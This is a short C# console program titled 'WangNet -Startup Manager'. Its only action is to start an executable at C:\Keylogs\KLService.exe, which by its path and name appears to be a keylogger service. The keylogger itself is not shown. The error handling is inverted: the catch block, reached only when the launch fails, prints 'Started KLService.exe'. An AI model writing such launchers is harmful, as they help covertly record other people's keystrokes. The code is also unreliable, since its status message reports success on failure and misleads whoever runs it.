using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace StartupManager
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.Title = "WangNet -Startup Manager";
            try
            {
                Process.Start("C:\\Keylogs\\KLService.exe");
            }
            catch
            {
                Console.WriteLine("Started KLService.exe");
            }
        }
    }
}
